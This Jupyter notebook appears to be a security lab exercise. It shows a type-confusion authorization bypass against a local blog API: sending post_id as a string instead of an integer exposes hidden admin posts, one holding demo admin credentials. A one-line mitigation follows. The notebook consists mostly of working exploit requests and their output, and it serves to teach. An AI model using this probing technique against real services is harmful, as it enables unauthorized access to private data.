{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "r = requests.post(\"http://localhost:8080/types-mismatch/api\", json={\"post_id\": 3})"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'post': {'body': 'I bought a cat!', 'post_id': 3, 'title': 'Catz'}}"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "r.json()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'error': 'unauthorized', 'post': None}"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "requests.post(\"http://localhost:8080/types-mismatch/api\", json={\"post_id\": -11}).json()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'error': 'unauthorized', 'post': None}\n",
      "{'error': 'unauthorized', 'post': None}\n",
      "{'post': {'body': 'This is my first post (^,^)', 'post_id': 2, 'title': 'Welcome to my blog'}}\n",
      "{'post': {'body': 'I bought a cat!', 'post_id': 3, 'title': 'Catz'}}\n",
      "{'post': {'body': 'We moved to Osaka, Japan :)', 'post_id': 4, 'title': 'We moved!'}}\n",
      "{'post': {'body': 'Learning Japanese by watching animes (^-^)', 'post_id': 5, 'title': 'Learning Japanese'}}\n",
      "{'error': None, 'post': None}\n",
      "{'error': None, 'post': None}\n",
      "{'error': None, 'post': None}\n",
      "{'error': None, 'post': None}\n",
      "{'error': None, 'post': None}\n",
      "{'error': None, 'post': None}\n",
      "{'error': None, 'post': None}\n",
      "{'error': None, 'post': None}\n",
      "{'error': None, 'post': None}\n",
      "{'error': None, 'post': None}\n",
      "{'error': None, 'post': None}\n",
      "{'error': None, 'post': None}\n",
      "{'error': None, 'post': None}\n",
      "{'error': None, 'post': None}\n"
     ]
    }
   ],
   "source": [
    "for i in range(20):\n",
    "    print(requests.post(\"http://localhost:8080/types-mismatch/api\", json={\"post_id\": i}).json())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'post': {'body': 'My email is `superadmin@admin.com` and my password is `supersecurepassword123`',\n",
       "  'post_id': 1,\n",
       "  'title': 'Secret post by admin 2'}}"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "requests.post(\"http://localhost:8080/types-mismatch/api\", json={\"post_id\": \"1\"}).json()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'post': {'body': \"I don't like pineapple on pizza!\",\n",
       "  'post_id': 0,\n",
       "  'title': 'Secret post by admin 1'}}"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "requests.post(\"http://localhost:8080/types-mismatch/api\", json={\"post_id\": \"0\"}).json()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "``python 2 allows string and integer comparison``"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'post': {'body': \"I don't like pineapple on pizza!\", 'post_id': 0, 'title': 'Secret post by admin 1'}}\n",
      "{'post': {'body': 'My email is `superadmin@admin.com` and my password is `supersecurepassword123`', 'post_id': 1, 'title': 'Secret post by admin 2'}}\n",
      "{'post': {'body': 'This is my first post (^,^)', 'post_id': 2, 'title': 'Welcome to my blog'}}\n",
      "{'post': {'body': 'I bought a cat!', 'post_id': 3, 'title': 'Catz'}}\n",
      "{'post': {'body': 'We moved to Osaka, Japan :)', 'post_id': 4, 'title': 'We moved!'}}\n",
      "{'post': {'body': 'Learning Japanese by watching animes (^-^)', 'post_id': 5, 'title': 'Learning Japanese'}}\n",
      "{'error': None, 'post': None}\n",
      "{'error': None, 'post': None}\n",
      "{'error': None, 'post': None}\n",
      "{'error': None, 'post': None}\n",
      "{'error': None, 'post': None}\n",
      "{'error': None, 'post': None}\n",
      "{'error': None, 'post': None}\n",
      "{'error': None, 'post': None}\n",
      "{'error': None, 'post': None}\n",
      "{'error': None, 'post': None}\n",
      "{'error': None, 'post': None}\n",
      "{'error': None, 'post': None}\n",
      "{'error': None, 'post': None}\n",
      "{'error': None, 'post': None}\n"
     ]
    }
   ],
   "source": [
    "for i in range(20):\n",
    "    print(requests.post(\"http://localhost:8080/types-mismatch/api\", json={\"post_id\": str(i)}).json())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Mitigations"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "1. Use Python3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.7 (tflow)",
   "language": "python",
   "name": "tflow"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
